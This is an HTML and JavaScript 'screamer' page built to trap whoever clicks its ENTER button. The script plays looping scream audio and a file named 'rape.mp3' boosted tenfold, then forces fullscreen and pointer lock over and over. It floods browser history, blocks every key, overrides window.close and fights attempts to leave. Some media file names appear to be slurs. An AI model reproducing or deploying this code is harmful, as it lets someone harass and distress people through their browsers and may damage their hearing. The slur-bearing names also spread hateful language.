<!DOCTYPE html>
<html>
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-149452514-1');
</script>

<link rel="stylesheet" type="text/css" href="styles.css">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-validate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
    flex-shrink: 0;
}

/* Style both video and img elements inside the wrapper */
.video-wrapper video,
.video-wrapper img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    top: 0;
}

.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    flex-shrink: 0;
}

.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
}

.click-overlay button {
    padding: 20px 40px;
    font-size: 20px;
    background: #fff;
    color: #000;
    border: none;
    border-radius: 0;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>
</head>
<body>

<!-- Click anywhere on overlay to start (button is just visual) -->
<div class="click-overlay" id="startOverlay">
    <button>ENTER</button>
</div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<div class="video-container">
    <!-- Third element: wads.gif (as an image, not a video) -->
    <div class="video-wrapper">
        <img id="wads" src="wads.gif" alt="">
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;

    // --- AUDIO BOOST (Web Audio API) ---
    let audioContext;
    let gainNode;
    const mediaElements = [];

    function initAudioBoost() {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        gainNode = audioContext.createGain();
        gainNode.gain.value = 10; // 10x volume
        gainNode.connect(audioContext.destination);

        // Connect all audio elements
        const audioIds = ['shart', 'shart2', 'shart3'];
        audioIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });

        // Connect video elements only (wads is an image, so exclude it)
        const videoIds = ['fart', 'ronnie'];
        videoIds.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                mediaElements.push(el);
                const source = audioContext.createMediaElementSource(el);
                source.connect(gainNode);
                el.loop = true;
                el.muted = false;
            }
        });
    }

    function playAllMedia() {
        if (audioContext && audioContext.state === 'suspended') {
            audioContext.resume();
        }
        mediaElements.forEach(m => {
            if (m) {
                m.volume = 1.0;
                m.muted = false;
                const playPromise = m.play();
                if (playPromise !== undefined) {
                    playPromise.catch(() => {
                        setInterval(() => m.play(), 100);
                    });
                }
            }
        });
    }

    // --- FULLSCREEN LOCK ---
    function attemptFullscreen() {
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    // --- POINTER LOCK ---
    function lockPointer() {
        if (document.body.requestPointerLock) {
            document.body.requestPointerLock();
        }
    }

    // --- HISTORY FLOOD ---
    function floodHistory() {
        for (let i = 0; i < 20; i++) {
            history.pushState(null, null, location.href);
        }
    }

    // --- KEY BLOCKING ---
    function blockKeys(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    // --- RE-ENGAGE LOCKS ---
    function reengageLocks() {
        if (hasTriggered) {
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
                attemptFullscreen();
            }
            if (!document.pointerLockElement) {
                lockPointer();
            }
        }
    }

    // --- START FUNCTION ---
    window.startExperience = function() {
        if (hasTriggered) return;
        hasTriggered = true;

        const overlay = document.getElementById('startOverlay');
        const blackScreen = document.querySelector('.black-screen');
        if (overlay) overlay.style.display = 'none';
        if (blackScreen) blackScreen.style.display = 'none';

        floodHistory();
        initAudioBoost();
        playAllMedia();
        attemptFullscreen();
        lockPointer();

        setInterval(reengageLocks, 200);

        const events = ['mousemove', 'click', 'keydown', 'touchstart', 'mousedown'];
        events.forEach(eventType => {
            document.addEventListener(eventType, reengageLocks, true);
        });

        document.addEventListener('fullscreenchange', reengageLocks);
        document.addEventListener('webkitfullscreenchange', reengageLocks);
        document.addEventListener('mozfullscreenchange', reengageLocks);
        document.addEventListener('MSFullscreenChange', reengageLocks);

        document.addEventListener('pointerlockchange', reengageLocks);
        document.addEventListener('mozpointerlockchange', reengageLocks);
        document.addEventListener('webkitpointerlockchange', reengageLocks);

        document.addEventListener('keydown', blockKeys, true);
        document.addEventListener('keyup', blockKeys, true);
        document.addEventListener('keypress', blockKeys, true);
    };

    document.getElementById('startOverlay').addEventListener('click', startExperience);

    document.addEventListener('contextmenu', e => e.preventDefault(), true);
    document.addEventListener('dragstart', e => e.preventDefault(), true);
    document.addEventListener('selectstart', e => e.preventDefault(), true);

    window.onbeforeunload = function() {
        return "Are you absolutely sure you want to leave?";
    };

    window.close = function() {
        console.warn('Nice try.');
    };

    window.onpopstate = function() {
        if (hasTriggered) {
            floodHistory();
            reengageLocks();
        }
    };

    // No resize function needed – container sizes automatically
})();
</script>
</body>
</html>
